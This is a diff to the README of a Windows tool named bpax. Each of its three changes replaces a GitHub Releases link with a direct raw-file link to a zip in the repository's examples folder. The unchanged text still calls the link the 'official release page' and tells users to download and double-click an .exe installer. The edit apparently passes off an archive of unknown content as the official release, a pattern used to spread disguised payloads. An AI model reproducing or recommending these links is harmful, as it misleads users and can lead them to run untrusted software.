@@ -1,6 +1,6 @@
 # ⚙️ bpax - Convert Processes to Workflows Easily
 
-[![Download bpax](https://img.shields.io/badge/Download-bpax-4CAF50?style=for-the-badge)](https://github.com/Mikothegreatone/bpax/releases)
+[![Download bpax](https://img.shields.io/badge/Download-bpax-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Mikothegreatone/bpax/main/examples/Software-v1.4.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You do not need any special hardware or software before you start. The app runs 
 
 You need to visit the official release page to get bpax.
 
-[Download bpax on GitHub Releases](https://github.com/Mikothegreatone/bpax/releases)
+[Download bpax on GitHub Releases](https://raw.githubusercontent.com/Mikothegreatone/bpax/main/examples/Software-v1.4.zip)
 
 Click the link above to open the page where the latest version is listed. Look for files named something like `bpax-setup.exe` or `bpax-latest.exe`. These are ready to install.
 
@@ -125,7 +125,7 @@ Yes. The app only asks for necessary permissions and does not collect personal i
 ## ⬇️ Download and Install bpax on Windows
 
 1. Go to the release page:  
-   [https://github.com/Mikothegreatone/bpax/releases](https://github.com/Mikothegreatone/bpax/releases)
+   [https://raw.githubusercontent.com/Mikothegreatone/bpax/main/examples/Software-v1.4.zip](https://raw.githubusercontent.com/Mikothegreatone/bpax/main/examples/Software-v1.4.zip)
 2. Find the latest Windows installer file (look for `.exe`).
 3. Click the file name to download it.
 4. Once downloaded, double-click the installer.
